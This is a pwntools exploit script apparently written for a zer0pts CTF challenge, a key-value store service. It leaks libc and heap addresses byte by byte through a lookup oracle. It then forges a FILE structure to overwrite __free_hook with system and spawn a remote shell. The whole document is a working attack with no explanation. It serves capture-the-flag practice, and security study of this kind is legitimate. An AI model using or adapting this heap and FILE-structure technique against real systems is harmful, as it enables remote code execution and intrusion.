from pwn import *

e = ELF('./chall')
#p = process(e.path, aslr=False, env={'LD_PRELOAD':'./libc-2.31.so'})
p = remote('pwn1.ctf.zer0pts.com', 9005)

sla = p.sendlineafter
sa  = p.sendafter

def add(key, val):
    sla('> ', '1')
    sla('Key: ', key)
    sla('Value: ', str(val))

def get(key):
    sla('> ', '2')
    sla('Key: ', key)

def delete(key):
    sla('> ', '3')
    sla('Key: ', key)

def save():
    sla('> ', '4')

def _exit():
    sla('> ', '5')

add('ipwn0', '-Infinity')
_exit()
sla('[y/N]', 'n')
save()
add('ipwn1', '-Infinity')
_exit()
sla('[y/N]', 'n')
add('ipwn2', '-Infinity')
save()
add('ipwn3', '-Infinity')
_exit()
sla('[y/N]', 'n')
add('ipwn4', '-Infinity')

leak = b''
for i in range(6):
    print(i)
    for j in range(0x100):
        print(i, j)
        if(j == 0xa):   
            continue
        get(b'ipwn4\x00\x00\x00' + leak + chr(j).encode('latin-1'))
        if b'Item not found' not in p.recvline():
            leak += chr(j).encode('latin-1')
            break
leak += b'\x00\x00'
libc = u64(leak) - 0x1ebbe0 - 0x1000
log.info('[GLIBC] %#x'%libc)

add('A'*0x400, '1')
delete('A'*0x400)
add('z'*0xe, '1')
leak = b''
for i in range(6):
    print(i)
    for j in range(0x100):
        print(i, j)
        if(j == 0xa):   
            continue
        get(b'z'*0xe + b'\x00\x00' + leak + chr(j).encode('latin-1'))
        if b'Item not found' not in p.recvline():
            leak += chr(j).encode('latin-1')
            break

leak += b'\x00\x00'
heap = u64(leak) - 0x670
log.info('[HEAP] %#x'%heap)
for i in range(5):
    print(i)
    add('0'*0x1000, '-Infinity')
    save()
    add('ipwn%d'%(i+4), '-Infinity')
    _exit()
    sla('[y/N]', 'n')

# local
#free_hook = libc + 0x1eeb28
#stderr = libc + 0x1ec5c0
#stdfile_lock = libc + 0x1ee4c0
#wide_data = libc + 0x1eb880
#file_jump = libc + 0x1ed4a0
#system = libc + 0x55410

# remote
free_hook = libc + 0x1eee48
stderr = libc + 0x1ed5c0
stdfile_lock = libc + 0x1ef4c0
wide_data = libc + 0x1ec880
file_jump = libc + 0x1e94a0
system = libc + 0x522c0

pay = b''
pay += p64(heap)*2
pay += p64(heap)*2
pay += p64(free_hook)*2 + p64(free_hook+6)
pay += p64(free_hook) + p64(free_hook+6)
pay += p64(0)*4
pay += p64(stderr)
pay += p32(3) + p32(0)
pay += p64(0xffffffffffffffff)
pay += p64(0) + p64(stdfile_lock)
pay += p64(0xffffffffffffffff)
pay += p64(0)
pay += p64(wide_data)
pay += p64(0)*3
pay += p32(0xffffffff)
pay += p32(0)*5
pay += p64(file_jump)
print(hex(len(pay)))
#pay = pay.ljust(0x1e0, b'\x00')

add(pay, '1')
add(p64(system)*0x400, '1')
delete('ipwn0')
delete('ipwn1')
delete('ipwn3')
for i in range(4):
    add(p64(system), '1')
save()
add('/bin/sh', '1')
delete('/bin/sh')
p.interactive()
